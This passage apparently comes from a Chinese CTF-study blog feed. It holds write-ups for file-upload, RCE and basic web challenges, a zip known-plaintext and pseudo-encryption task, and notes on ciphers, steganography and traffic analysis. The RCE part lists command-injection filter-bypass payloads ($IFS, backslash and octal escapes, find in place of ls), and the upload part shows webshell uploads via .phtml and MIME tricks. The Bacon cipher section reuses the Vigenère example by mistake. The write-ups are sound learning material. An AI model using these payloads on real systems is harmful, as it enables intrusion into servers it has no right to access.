src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-15-30.png" alt="PixPin_2025-03-11_21-15-30"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-17-58.png" alt="PixPin_2025-03-11_21-17-58"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-23-28.png" alt="PixPin_2025-03-11_21-23-28"></p><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>[<a href="https://www.nssctf.cn/problem/388">SWPUCTF 2021 新生赛]easyupload1.0</a></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-48-37.png" alt="PixPin_2025-03-16_14-48-37"></p><p>一句话木马改一下后缀上传，在bp里再改回来</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-48-56.png" alt="PixPin_2025-03-16_14-48-56"></p><p>上传成功，用蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-50-12.png" alt="PixPin_2025-03-16_14-50-12"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-53-01.png" alt="PixPin_2025-03-16_14-53-01"></p><p>也是成功找到了错误的flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-56-24.png" alt="PixPin_2025-03-16_14-56-24"></p><p>在网上搜wp发现在phpinfo<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-57-13.png" alt="PixPin_2025-03-16_14-57-13"></p><p>[<a href="https://www.nssctf.cn/problem/423">SWPUCTF 2021 新生赛]easyupload2.0</a></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-02-39.png" alt="PixPin_2025-03-16_15-02-39"></p><p>也是一样的开始，然后是很多无用的尝试</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-14-34.png" alt="PixPin_2025-03-16_15-14-34"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-15-32.png" alt="PixPin_2025-03-16_15-15-32"></p><p>能上传但是连接不上，好像是因为<strong>服务器的 MIME 类型限制</strong>，可能不允许 <code>image/jpeg</code> 执行 PHP</p><p>改了也不行，。。适用：服务器仅<strong>检查 MIME 类型</strong>，但不会实际解析内容时适用。</p><p>适用于<strong>基于前端 JavaScript 检查 MIME</strong>的绕过。</p><p>如果服务器 <strong>二次校验文件内容</strong>（如 <code>fileinfo</code> 函数），则可能无法绕过。</p><p><a href="https://blog.csdn.net/m0_53008479/article/details/123366077">1-4 【实验】04-phtml绕过+代码审计-CSDN博客</a></p><p><strong>如果你的文件是以phtml结尾的，它会把它当作php代码来执行。</strong></p><p>太好了我们有救了<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-25-41.png" alt="PixPin_2025-03-16_15-25-41"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-26-09.png" alt="PixPin_2025-03-16_15-26-09"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-31-08.png" alt="PixPin_2025-03-16_15-31-08"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>[<a href="https://www.nssctf.cn/problem/3090">UUCTF 2022 新生赛]ez_rce</a></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-58-08.png" alt="PixPin_2025-03-16_16-58-08"></p><p>疑似把我知道的全过滤了，，，，，，</p><p><a href="https://zhuanlan.zhihu.com/p/391439312">命令执行(RCE)面对各种过滤，骚姿势绕过总结 - 知乎</a></p><p>cat被过滤用了find</p><p>system用了printf</p><p>ls被过滤</p><p>可以在中间用反斜杠\ </p><p>&#x2F;?code&#x3D;printf(<code>l\s /</code>);</p><p>?code&#x3D;printf(<code>l$IFS$s /</code>);   # IFS 变量绕过<br>?code&#x3D;printf(<code>\154\163 /</code>);  # ASCII 码 (\154 &#x3D; l, \163 &#x3D; s)</p><p>?code&#x3D;printf(<code>l&quot;.&quot;s /</code>);</p><p>?code&#x3D;printf(<code>l$&#123;&#39;&#39;&#125;s /</code>);</p><h3 id="find-代替-ls"><a href="#find-代替-ls" class="headerlink" title="find 代替 ls"></a><strong><code>find</code> 代替 <code>ls</code></strong></h3><p>如果 <code>ls</code> 被严格禁止，可以</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">?code=<span class="hljs-built_in">printf</span>(`find / -maxdepth <span class="hljs-number">1</span>`);<br></code></pre></td></tr></table></figure><p> <code>/</code> 目录下的内容，类似 <code>ls /</code>。</p><p>注：</p><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p><p><a href="https://blog.csdn.net/2301_76690905/article/details/134533626">命令执行RCE及其绕过详细总结（各情景下的绕过）_命令执行绕过-CSDN博客</a></p><p>绕过就行了</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-37-57.png" alt="PixPin_2025-03-16_16-37-57"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-41-21.png" alt="PixPin_2025-03-16_16-41-21"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-49-37.png" alt="PixPin_2025-03-16_16-49-37"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-58-08.png" alt="PixPin_2025-03-16_16-58-08"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>RCE绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web题目wp</title>
    <link href="/2024/12/06/web%E9%A2%98%E7%9B%AEwp/"/>
    <url>/2024/12/06/web%E9%A2%98%E7%9B%AEwp/</url>
    
    <content type="html"><![CDATA[<h2 id="web题目wp"><a href="#web题目wp" class="headerlink" title="web题目wp"></a>web题目wp</h2><h2 id="1-会赢吗"><a href="#1-会赢吗" class="headerlink" title="1.会赢吗"></a>1.会赢吗</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20154344.png" alt="屏幕截图 2024-11-28 154344"></p><p>先查看网页源代码</p><p>在body部分找到flag第一部分和第二部分地址</p><p>![屏幕截图 2024-11-28 193756](C:\Users\Lenovo\Pictures\Screenshots\屏幕截图 2024-11-28 193756.png)</p><p>进入第二部分</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20154659.png" alt="屏幕截图 2024-11-28 154659"></p><p>提示在控制台进行应用<br>依旧查看网页源代码<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20194122.png" alt="屏幕截图 2024-11-28 194122"></p><p>可见传一个参数（课程名）调用函数revealFlag<br>课程名</p><p>在控制台输入命令</p><p>![屏幕截图 2024-11-28 203252](C:\Users\Lenovo\Pictures\Screenshots\屏幕截图 2024-11-28 203252.png)<br>revealFlag（’4cqu1siti0n‘)<br>得到第二部分flag 和进入第三部分的网址</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20204212.png" alt="屏幕截图 2024-11-28 204212"></p><p>进入第三部分</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20204321.png" alt="屏幕截图 2024-11-28 204321"></p><p>依旧是查看网页源代码 复制主体部分给ai</p><p>可见我们要把状态改为解封然后点击解封按钮</p><p>把前端代<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20225511.png" alt="屏幕截图 2024-11-28 225511"></p><p>码修改一下保存</p><p>得到第三部分flag和第四部分地址</p><p>进入第四部分</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20161927.png" alt="屏幕截图 2024-11-28 161927"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20225709.png" alt="屏幕截图 2024-11-28 225709"></p><p>查看网页源代码发现 noscript代码部分执行后会显示出flag<br>搜索后得知可以在网页中禁用JavaScript<br>更改后刷新</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20230037.png" alt="屏幕截图 2024-11-28 230037"></p><p>得到最后一部分flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20230131.png"></p><p>将每一部分获得的flag拼接在一起 推测是base64编码</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202024-11-28%2520230356.png" alt="屏幕截图 2024-11-28 230356"></p><p>解码后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20230356.png" alt="屏幕截图 2024-11-28 230356"></p><h1 id="2-headache3"><a href="#2-headache3" class="headerlink" title="2.headache3"></a>2.headache3</h1><p>打开后依旧先看一下源代码</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20231349.png" alt="屏幕截图 2024-11-28 231349"></p><p>十分简单没什么内容 但是head大写可能是查看什么文件头</p><p>在刷新一下 network部分得到了一个响应包<br>文件头部分有flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202024-11-28%2520231625.png" alt="屏幕截图 2024-11-28 231625"></p><h1 id="3-get"><a href="#3-get" class="headerlink" title="3.get"></a>3.get</h1><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232121.png" alt="屏幕截图 2024-11-28 232121"></p><p>获得题目后发现是让get传参<br>直接在地址栏里按照要求输入</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232215.png" alt="屏幕截图 2024-11-28 232215"></p><h1 id="4-POST"><a href="#4-POST" class="headerlink" title="4.POST"></a>4.POST</h1><p>启用场景后发现是要post传参</p><p>burp抓包一下</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%25E5%25B1%258F%25E5%25B9%2595%25E6%2588%25AA%25E5%259B%25BE%25202024-11-28%2520232751.png" alt="屏幕截图 2024-11-28 232751"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232836.png" alt="屏幕截图 2024-11-28 232836"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20232942.png" alt="屏幕截图 2024-11-28 232942"></p><p>右键修改请求方式<br>传参（post传参要先空一行再传参）</p><p>![屏幕截图 2024-11-28 233217](C:\Users\Lenovo\Pictures\Screenshots\屏幕截图 2024-11-28 233217.png)</p><p>但是这样传参只能得到字符串‘flag’ 查看评论后发现输入what&#x3D;flag&amp;&#x3D;<br>可以得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20234701.png" alt="屏幕截图 2024-11-28 234701"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NewStarCTF2024</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>这个压缩包有点麻烦</title>
    <link href="/2024/12/05/%E8%BF%99%E4%B8%AA%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9C%89%E7%82%B9%E9%BA%BB%E7%83%A6/"/>
    <url>/2024/12/05/%E8%BF%99%E4%B8%AA%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9C%89%E7%82%B9%E9%BA%BB%E7%83%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h2 id="1-这个压缩包有点麻烦"><a href="#1-这个压缩包有点麻烦" class="headerlink" title="1.这个压缩包有点麻烦"></a>1.这个压缩包有点麻烦</h2><p>下载压缩包可以看到有注释，提示是六位数字的暴力破解</p><p>暴力破解得到密码</p><p>密码为 483279</p><p>打开文档后看到提示</p><p>可以确定是使用字典爆破</p><p>​    得到压缩包密码    &amp;-&#96;;qpCKliw2yTR\</p><p>zip压缩包里面还有一个文件和之前的readme是一样的文件（已知部分明文），所以直接明文攻击<br>根据提示：注意将明文压缩时，压缩包的属性要设置为<strong>仅储存</strong></p><p>确保压缩后的zip与同名文档CRC32码一致</p><h3 id="已知明文攻击的方法"><a href="#已知明文攻击的方法" class="headerlink" title="已知明文攻击的方法"></a>已知明文攻击的方法</h3><p>已知明文攻击的特点是已知一个ZIP压缩包中某个文件的原文件（也就是明文），利用已知文件和其压缩加密后的数据获取到压缩包的解压密码或者能对其解压。</p><p>常规已知明文攻击要想成功，需要具备3个条件：</p><p> 1）完整的明文文件。</p><p> 2）明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）。</p><p> 3）明文对应文件的加密算法是ZipCrypto Store。</p><p>只需要记住，即使在没有压缩密码的情况下，只要能获取3个密钥，就能实现解密。如果我们已知压缩包中的某个文件，就可以利用算法获取这3个密钥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205005520726.png" alt="image-20241205005520726"></p><p>单击“开始”按钮后，破解开始。使用ARCHPR进行已 知明文攻击时有一个重大BUG，即使工具已经恢复出3个密钥，程序也不会自动停止，需要我们手动暂停。根据比赛经验，一般程序运行20 ～30分钟就可以手动停止，如果ARCHPR找到了3个密钥，也就是图 1.5.23中的加密密钥，那么单击“停止”后会自动弹出窗口</p><p>单击“确定”后，会弹出新的保存文件窗口</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205013556922.png" alt="image-20241205013556922"></p><p>压缩包里只有一张ipg格式的文件</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205014603949.png" alt="image-20241205014603949"></p><h3 id="分离图片中的隐藏文件"><a href="#分离图片中的隐藏文件" class="headerlink" title="分离图片中的隐藏文件"></a>分离图片中的隐藏文件</h3><h4 id="图片分析"><a href="#图片分析" class="headerlink" title="图片分析"></a>图片分析</h4><p>首先对图片进行分析，用binwalk（<a href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>中是自带的，也可以下载到windows中使用）。</p><p>使用方法：binwalk + 文件路径&#x2F;文件名</p><p>执行命令后，binwalk就会自动分析这个jpg文件：</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205015107323.png" alt="image-20241205015107323"></p><p>从分析的结果看，这个jpg文件隐藏着一个zip文件</p><h4 id="图片分离"><a href="#图片分离" class="headerlink" title="图片分离"></a>图片分离</h4><p>1,binwalk分离</p><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=flag.jpg of=1.zip skip=20421 bs=1<br><br></code></pre></td></tr></table></figure><p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过20421个块后开始复制，bs设置每次读写块的大小为1字节</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205020021102.png" alt="image-20241205020021102"></p><p>执行后会得到一个1.zip文件。</p><p>2.hex编辑器分类</p><p>经过分析ipg文件里隐藏了一个zip压缩包</p><p>搜索十六进制数值确定zip文件头</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205113642931.png" alt="image-20241205113642931"></p><p>作为选块起始位置</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205113826881.png" alt="image-20241205113826881"></p><p>最后作为选块结束位置</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205113938357.png" alt="image-20241205113938357"></p><p>复制选块至新文件</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205114028296.png" alt="image-20241205114028296"></p><p>得到一个zip压缩包</p><p>打开发现里面有一张ipg图片 需要输入密码</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205114206621.png" alt="image-20241205114206621"></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><p>伪加密的原理是：ZIP压缩包生成时没有加密，手工修 改“frFlags”或“deFlags”的值，使得同一个文件的这两个字段中 至少一个 为奇数，这样在解压时会弹出密码输入框，无论输入什么密码都会报 错。这种原压缩包没有加密，但通过人工修改造成解压时需要输入密 码的现象，就叫作伪加密。</p><p>破解ZIP伪加密的方法十分简单。</p><p>如果“frFlags”和“deFlags”的值不相 同，例如，“frFlags”的值是奇数，“deFlags”的值是偶数，那么可以 把“frFlags”的值改为“deFlags”的值，然后解压查看结果。</p><p>使“frFlags”和“deFlags”都是同一个奇数，我们仍然怀疑该ZIP文件存 在伪加密，那么可以把这两个字段的值都 减1，改为相同的偶数，然后 进行解压查看其结果。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205115502622.png" alt="image-20241205115502622"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205115520321.png" alt="image-20241205115520321"></p><p>如图把两个值都改为8 </p><p>成功打开压缩包</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/image-20241205115606936.png" alt="image-20241205115606936"></p><p>得到最终flag</p><p>hgame{W0w!_y0U_Kn0w_z1p_3ncrYpt!}</p>]]></content>
    
    
    <categories>
      
      <category>实操</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Misc</tag>
      
      <tag>已知明文攻击</tag>
      
      <tag>文件分离</tag>
      
      <tag>zip伪加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>week2</title>
    <link href="/2024/10/27/week2/"/>
    <url>/2024/10/27/week2/</url>
    
    <content type="html"><![CDATA[<h1 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><p>【古典密码】是密码学中的其中一个类型，其大部分加密方式都是利用 <em>替换式密码</em> 或 <em>移项式密码</em>，有时则是两者 的混合。</p><h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成 密文。 例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E。<br>通过排列明文和密文字母表，密文字母表示通过将明文字母表向左或向右移动一个固定数目的位置。例如，当偏移 量是左移3的时候（解密时的密钥就是3）<br>![[Pasted image 20241024224947.png]]</p><h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>是由一些偏移量不同的恺撒密码组成。 为了生成密码，需要使用表格法。 这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进 行的，在过程中会不断地变换<br><strong>加密过程</strong>：<br>密钥循环与明文对应表格得到密文<br><strong>解密过程</strong>：找到密钥一列密文对应哪一行<br>![[Pasted image 20241024225437.png]]</p><p>假设明文为：HEETIAN 然后选择某一关键词并重复而得到密钥，如关键词为LAB时，密钥为：LABLABL 对于明文的第一个字母H，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母S。 类似地，明文第二个字母为E，在表格中使用对应的A行进行加密，得到密文第二个字母E。以此类推，可以得到：<br>明文：HEETIAN 密钥：LABLABL 密文：SEFEIBY<br>解密的过程则与加密相反。 例如：根据密钥第一个字母L所对应的L行字母表，发现密文第一个字母S位于H列，因而明文第一个字母为H。 密钥第二个字母A对应A行字母表，而密文第二个字母E位于此行E列，因而明文第二个字母为E。以此类推便可得到明文</p><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>培根密码的本质是将字母用一串二进制数替换，但是表示的过程中，没有采取0和1的形式，而使用a和b来代替<br><strong>加密的过程</strong><br>首先将要加密的内容根据加密表里的内容进行替换， 如a用AAAAA替换，b用AAAAB替换。 替换完之 后，我们可以把A和B当作两个不同的特征（如大写&#x2F;小写，正体&#x2F;斜体）带入到一个<em>无关的句子</em>中， 这就得到了我 们加密后的结果。 其本质上是将二进制信息通过样式的区别，加在了正常书写之上。<br>![[Pasted image 20241024231439.png]]<br>例如，假设明文为：HEETIAN 然后选择某一关键词并重复而得到密钥，如关键词为LAB时，密钥为：LABLABL 对于明文的第一个字母H，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母S。 类似地，明文第二个字母为E，在表格中使用对应的A行进行加密，得到密文第二个字母E。以此类推，可以得到： 明文：HEETIAN 密钥：LABLABL 密文：SEFEIBY 解密的过程则与加密相反。 例如：根据密钥第一个字母L所对应的L行字母表，发现密文第一个字母S位于H列，因而明文第一个字母为H。 密钥第二个字母A对应A行字母表，而密文第二个字母E位于此行E列，因而明文第二个字母为E。以此类推便可得到明文。</p><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p><strong>加密过程</strong>：n栅密码分n组 把每组第一个第二个等分别拿出来形成密文</p><p> 以2栏栅栏密码为例来讲解它的加密和解密过程。 加密过程： 解密过程： 那么如何将2栏密码扩展到多栏呢？在之前的明文中，CIPHER这个单词之后加了一个下划线， 目的就是为了让明文 字符串的长度是2的倍数， 栅栏密码的分栏的一个前提就是分的栏数需是明文长度的因数，这样才会使得分出来的 每个栏长度都一样。 对于多栏，我们还是用上面的例子来讲解。 上面的明文字符串（THERE_IS_A_CIPHER_）的长度是18 所以我们可以把它分为2，3，4，6，9栏，这里我们以6栏为例。 以每个元素相隔6个字符分割出栅栏。 明文：THERE_IS_A_CIPHER_ 两个一组，得到：(TH) (ER) (E_) (IS) (<em>A) (<em>C) (IP) (HE) (R</em>) 先每组中取出第一个字母：TEEI__IHR 再从每组中取出第二个字母：HR_SACPE</em> 连在一起得到密文：TEEI__IHRHR_SACPE_ 而解密的时候，先把密文从中间分开，变为两行： TEEI__IHR HR_SACPE_ 再按上下上下的顺序组合起来： THERE_IS_A_CIPHER_</p><h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p>[ASCII码](<a href="https://www.asciim.cn/">ASCII码 - 基本ASCII码和扩展ASCII码,中文最全ASCII码对照表0~255</a>)</p><h4 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h4><ol><li>使用十六个字符（16进制）0-9 A-F 不区分大小写<br><strong>加密过程</strong> 根据ASCII码转换为二进制 四个一组划分 每组再转化为16进制</li></ol><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><ol><li>32个可打印字符 （A-Z 2-7）</li><li>Base32主要用于编码二进制数据，但是Base32也能够编码诸如ASCII之类的二进制文本。<br><strong>加密过程</strong> 根据ASCII码转换为二进制 五个一组划分（不够补0） 不足四十倍数补&#x3D;<br>一个&#x3D;相当于五个字节<br>![[Pasted image 20241024233351.png]]</li></ol><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>64个可打印字符（a-z A-Z 0-9 + &#x2F;）<br>根据ASCII码转换为二进制 6个一组不够补零 整体不够24的倍数补&#x3D; 一个&#x3D;相当于6bit<br>![[Pasted image 20241024234013.png]]</p><p>区分base16 base32 base64<br>有小写base64<br>有等号base32 base64</p><h1 id="MISC-隐写"><a href="#MISC-隐写" class="headerlink" title="MISC-隐写"></a>MISC-隐写</h1><p>原理：把秘密隐藏到普通的信息中，但是目前的隐写术是将某些秘密信息隐藏于数字媒介中，而又不损害载体原来信息的表达，从而掩盖秘密信息。常见的隐写载体包括文本，图像，音频，视频等。比赛中主要考察两点：隐写方法的识别和信息提取。</p><h2 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h2><p>常见的图像隐写分为两类：插入隐写和替换隐藏</p><p>插入隐写：指利用文件格式的冗余性，在不影响文件的正常使用从而隐藏信息，这种方法会导致文件的大小发生变化，<br>将1.jpg和1.zip进行合并之后，仍然得到一个和1.jpg“一摸一样”的图片，但是我们查看文件大小之后发现，大小正好是两者之和。<br>替换隐写（常考）：也就是将几乎不影响文件内容的数据进行修改，达到隐藏信息的目的，最常见的是最低比特位隐写（LSB隐写）。因为有损压缩会损毁修改掉的微小信息</p><h4 id="LSB隐写：在图像中，每一个通道由8比特构成，像素值在0-255之间，在单通道图像中，通过不同的黑白比例达到不同的灰度，三通道图像中（RGB），每个通道代表红，绿，蓝，在RGBA图像中，多出一个透明度通道。因为二进制数据的最后一位大小改变的影响很小，就可以在这里替换数据。"><a href="#LSB隐写：在图像中，每一个通道由8比特构成，像素值在0-255之间，在单通道图像中，通过不同的黑白比例达到不同的灰度，三通道图像中（RGB），每个通道代表红，绿，蓝，在RGBA图像中，多出一个透明度通道。因为二进制数据的最后一位大小改变的影响很小，就可以在这里替换数据。" class="headerlink" title="LSB隐写：在图像中，每一个通道由8比特构成，像素值在0~255之间，在单通道图像中，通过不同的黑白比例达到不同的灰度，三通道图像中（RGB），每个通道代表红，绿，蓝，在RGBA图像中，多出一个透明度通道。因为二进制数据的最后一位大小改变的影响很小，就可以在这里替换数据。"></a>LSB隐写：在图像中，每一个通道由8比特构成，像素值在0~255之间，在单通道图像中，通过不同的黑白比例达到不同的灰度，三通道图像中（RGB），每个通道代表红，绿，蓝，在RGBA图像中，多出一个透明度通道。因为二进制数据的最后一位大小改变的影响很小，就可以在这里替换数据。</h4><p>每一个色素都由RGB（红绿蓝）三种颜色组成，每种颜色的占比不同，所调出来的颜色不同。红218（11011010），绿150（10010110），红（10010101），假如改变每种颜色二进制数字的最后一位，对于整体的颜色改变， 肉眼并不能观察出来，从而达到隐藏信息的目的</p><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>PNG图片（无损压缩）<br>PNG图片文件头的16进制表示：89 50 4E 47<br>一个png图片的数据可以分为多个数据块。</p><p>我们之所以能看到图片，就是因为图片查看器将图片所对应的二进制字节流按照它的解释规则将图片转换为色素块，分析一个图片通常是查看它的原始二进制字节流</p><ol><li><p>IHDR数据块：文件头数据块，通常包含图片的高度和宽度等基本属性，可以通过将crc还原出来所对应的&#x3D;&#x3D;高度&#x3D;&#x3D;和&#x3D;&#x3D;宽度&#x3D;&#x3D;来找到flag。<br> ![[Pasted image 20241027121726.png]]</p></li><li><p>cHRM数据块。</p></li><li><p>IDAT数据块（多个）（包含图片内容）：包含了数据的构成参数。如果该数据块有问题，有一种题型是在该数据块中存有压缩包，通过Zlib工具解压缩查看内容。</p></li><li><p>IEAD数据块：图片结束标志。</p></li></ol><h3 id="JPG-（有损或者无损）"><a href="#JPG-（有损或者无损）" class="headerlink" title="JPG （有损或者无损）"></a>JPG （有损或者无损）</h3><p>JPG图片（由一个一个段组成）</p><p>文件头识别：FFD8</p><h3 id="GIF（无损）"><a href="#GIF（无损）" class="headerlink" title="GIF（无损）"></a>GIF（无损）</h3><p>GIF图片文件头：GIF89a&#x2F;GIF87a</p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p><strong>流量捕获</strong> 通常题目会提供一个 .pcap 文件，它是网络数据包的捕获文件，我们需要分析其中的流量数据。<br>流量分析的常见流程</p><ol><li>初步检查流量文件 使用Wireshark打开 </li><li>协议识别与分析 .pcap 文件，查看流量总量、协议类型</li><li>查找最多或者最少流量。 </li><li>筛选和过滤数据包 使用Wireshark的过滤器功能，逐步缩小感兴趣的范围。比如，HTTP流量的过滤条件 是http，DNS是 dns ，通过源&#x2F;目的IP、端口等进一步过滤。</li><li>查找数据流</li></ol><p>搜索格式为frame contains “ “<br>Liunx系统下配置文件放在etc目录 下，</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编码解码</tag>
